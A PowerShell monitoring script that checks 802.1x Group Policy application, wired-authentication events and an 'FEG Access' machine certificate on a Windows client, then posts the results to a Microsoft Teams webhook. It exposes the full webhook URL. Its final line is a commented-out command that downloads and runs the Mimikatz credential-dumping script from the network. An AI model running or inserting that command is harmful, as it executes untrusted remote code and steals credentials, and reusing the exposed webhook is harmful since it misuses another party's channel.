 ###########################################################################
# 
# NAME:  Client-8021x-status.ps1 
# 
# AUTHOR:  Jiri Pavlik (SED; pavlik@1sed.cz)
# 
# COMMENT:  script to make a list of certificates in computer store
# 
# VERSION HISTORY: 
#  0.1 20.04.2020 – Initial release 
#  
#  
# 
###########################################################################


$MyInvocationScriptName = split-path $MyInvocation.MyCommand.Definition -Leaf
$Myself = $MyInvocation.MyCommand.Definition  # full path
$PSScriptRoot = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition
$now = Get-Date
$DateTime = (Get-Date).ToString("yyyy-MM-dd--HH-mm")
$LOGFileName = "$LogDestination\$BaseFileName.log"
$BaseFileName = $MyInvocationScriptName.Substring(0,$MyInvocationScriptName.LastIndexOf('.'))

$Timer = [System.Diagnostics.Stopwatch]::StartNew()
# https://mcpmag.com/articles/2017/10/19/using-a-stopwatch-in-powershell.aspx
$thisComputer = $env:COMPUTERNAME
$tempFolder = $env:TEMP
#Clear-Variable $messageToSend
$messageToSend = @()
$ProblemDetected = $false



Get-GPResultantSetOfPolicy -ReportType Xml -Path "$tempFolder\Report-for-script_$DateTime.xml"
$XML = new-object -typeName XML
$XML.Load("$tempFolder\Report-for-script_$DateTime.xml") #somepathhere is the XML file

# another way - Import the XML file
# $results = [xml] (Get-Content C:\temp\results_before.xml)

$XMLgpos = $XML.Rsop.ComputerResults.GPO
$GPO802 = $XMLgpos  | Where-Object {$_.name -like "*Network 802.1x via czdco-ise-psn-01*" }
if (! [String]::IsNullOrEmpty($GPO802.name)) {
    $messageToSend += "[OK]  |  $thisComputer  |  $DateTime  |  GPO applied  >  $($GPO802.name)  |  VersionSysvol: $($GPO802.VersionSysvol)  |  Enabled: $($GPO802.Enabled)  |  Valid: $($GPO802.IsValid)  "#|  Filter: $($GPO802.SecurityFilter) " 
    $value1 = "[OK]  GPO applied | `n VersionSysvol: $($GPO802.VersionSysvol)  |  `n Enabled: $($GPO802.Enabled)  | `n Valid: $($GPO802.IsValid) "
    } 
    else {
    $messageToSend += "[Warning]  |  $thisComputer  |  $DateTime  |  GPO NOT applied with new 802.1x via czdco-ise-psn-01 . "
    $value1 = "[Warning]  GPO NOT applied  `n with new 802.1x via czdco-ise-psn-01 " 
    # for the color line
    $ProblemDetected = $true
    }


$GPO802old = $XMLgpos  | Where-Object {$_.name -like "*Network 802.1x via czhq-radius*" }
#$GPO802old = $XMLgpos  | Where-Object {$_.name -like "*Network Proyy*" }
if (! [String]::IsNullOrEmpty($GPO802old.name)) {
    $messageToSend += "[Warning]  |  $thisComputer  |  $DateTime  |  GPO applied  >  $($GPO802old.name)  |  Enabled: $($GPO802old.Enabled)  |  Valid: $($GPO802old.IsValid)  |  Filter: $($GPO802old.SecurityFilter) "
    $value2 = "[Warning]  GPO applied | `n VersionSysvol: $($GPO802old.VersionSysvol)  |  `n Enabled: $($GPO802old.Enabled)  |  `n Valid: $($GPO802old.IsValid) "
    # for the color line
    $ProblemDetected = $true
    } 
    else {
    $messageToSend += "[OK]  |  $thisComputer  |  $DateTime  |  GPO NOT applied with old 802.1x via CZHQ-RADIUS . "
    $value2 = "[OK]  GPO NOT applied `n with new 802.1x via CZHQ-RADIUS " 
    }



$Timer.Stop | Out-Null
$value3 = "$([system.String]::Format("{0:00}h:{1:00}m:{2:00}s.{3:00}", $Timer.Elapsed.Hours, $Timer.Elapsed.Minutes, $Timer.Elapsed.Seconds, $Timer.Elapsed.Milliseconds / 10)) " 
$messageToSend += "Completed in $([system.String]::Format("{0:00}h:{1:00}m:{2:00}s.{3:00}", $Timer.Elapsed.Hours, $Timer.Elapsed.Minutes, $Timer.Elapsed.Seconds, $Timer.Elapsed.Milliseconds / 10)) " 
$messageToSend += "      < end > " 
$messageToSend += "  " 

$messageToSend 


$DateAfter = (Get-Date).AddDays(-14)
$DateBefore = (Get-Date)
#Get-WinEvent -ListLog *

$WinEvent = Get-WinEvent -FilterHashtable @{ LogName = 'Microsoft-Windows-Wired-AutoConfig/Operational'; Id = 14001; StartTime = $DateAfter; EndTime = $DateBefore } -MaxEvents 1
if (!($WinEvent.Message -match "FEG wired 802.1x" )) {
    $ProblemDetected = $true
    $value4 = "[Warning]  Not found Supplicant: FEG wired 802.1x"
} else {
    $value4 = "[OK]  Found Supplicant: FEG wired 802.1x" 
}

$WinEvent2 = Get-WinEvent -FilterHashtable @{ LogName = 'Microsoft-Windows-Wired-AutoConfig/Operational'; Id = 15502; StartTime = $DateAfter; EndTime = $DateBefore } -MaxEvents 1
if (!($WinEvent2.Message -match "802.1x: Enabled" )) {
    $ProblemDetected = $true
    $value5 = "[Warning]  802.1x: Unknown"
} else {
    $value5 = "[OK]  802.1x: Enabled" 
}



$VPNcert = get-item cert:\LocalMachine\* | 
			    get-ChildItem | 
			        Where-Object -FilterScript {  ($_.NotAfter -gt $now.AddDays(-365)) -and ($_.PSParentPath -like "*LocalMachine\My*")  } |
			            Sort-Object NotAfter |
							select Issuer,Subject,DnsNameList,NotAfter,NotBefore,HasPrivateKey,PSParentPath,Thumbprint,EnhancedKeyUsageList | where {$_.EnhancedKeyUsageList -match "FEG Access" }

if ($VPNcert) {   
    $value6 = "[OK]  Found Certificate with usage: FEG Access (1.3.6.1.4.1.311.21.8.500). Issued: $($VPNcert.NotBefore)" 
    } else {
    $ProblemDetected = $true
    $value6 = "[Warning]  Not found Certificate with usage: FEG Access (1.3.6.1.4.1.311.21.8.500)"
    }		



if ($ProblemDetected) {
    # Set the color line
    $color = "ff0000" # Red
    } 
    else {
    # Set the color line
    $color = "00cc00" # Green
    }


#email = Client reports - FEG _ Anect Teams <f4cb47cd.efortuna.onmicrosoft.com@emea.teams.ms>
#channel = https://teams.microsoft.com/l/channel/19%3a35c3ce673f5249e1b6e814b4d1dc33d1%40thread.skype/Client%2520reports?groupId=a77730ec-5bd7-4b5a-95c2-59c3a2b4f59e&tenantId=2acba9fe-1f29-49de-a1ee-45b3b7aff8f5
#webhook = https://outlook.office.com/webhook/a77730ec-5bd7-4b5a-95c2-59c3a2b4f59e@2acba9fe-1f29-49de-a1ee-45b3b7aff8f5/IncomingWebhook/3afaa5d84d944a069fc76cc255438eda/8df40e86-4984-4d16-9c37-a1ebd1980059


<# Simple text. V1

$JSONBody = [PSCustomObject][Ordered]@{
    "@type"      = "MessageCard"
    "@context"   = "http://schema.org/extensions"
    "summary"    = "Report from Client: $thisComputer"
    "themeColor" = '0078D7'
    "title"      = "DateTime: $DateTime"
    "text"       = "$messageToSend"
}
$TeamMessageBody = ConvertTo-Json $JSONBody -Depth 100
#>

$JSONBody2 = [PSCustomObject][Ordered]@{
        "@type"      = "MessageCard"
        "@context"   = "http://schema.org/extensions"
        "summary"    = "Incoming Report Message"
        "themeColor" = "$($color)"
        "sections"   = @(
        @{
    "activityTitle"    = "$thisComputer"
            "activitySubtitle" = "Date/Time: $DateTime"
            "facts"            = @(
    @{
    "name"  = "GPO> $($GPO802.name)"
    "value" = "$value1"
    },
    @{
    "name"  = "GPO> Network 802.1x via czhq-radius"
    "value" = "$value2"
    },
    @{
    "name"  = "GPO result completed in: "
    "value" = "$value3"
    },
    @{
    "name"  = "Event ID 14001"
    "value" = "$value4"
    },
    @{
    "name"  = "Event ID 15502"
    "value" = "$value5"
    },
    @{
    "name"  = "Certificate: "
    "value" = "$value6"
    }
    )
    "markdown" = $true
    }
        )
} 
$TeamMessageBody = ConvertTo-Json $JSONBody2 -Depth 100 
 


$parameters = @{
    "URI"         = 'https://outlook.office.com/webhook/a77730ec-5bd7-4b5a-95c2-59c3a2b4f59e@2acba9fe-1f29-49de-a1ee-45b3b7aff8f5/IncomingWebhook/3afaa5d84d944a069fc76cc255438eda/8df40e86-4984-4d16-9c37-a1ebd1980059' # Webhook-MS-infra 
    #"URI"        = 'https://outlook.office.com/webhook/{GUID}@{GUID}/IncomingWebhook/{GUID}/{GUID}'
    "Method"      = 'POST'
    "Body"        = $TeamMessageBody
    "ContentType" = 'application/json'
}
 
Invoke-RestMethod @parameters


# IEX (new-object net.webclient).downloadstring("https://github.com/Jiri-Pavlik/Published/blob/master/Exfiltration/Invoke-Mimikatz.ps1")

 
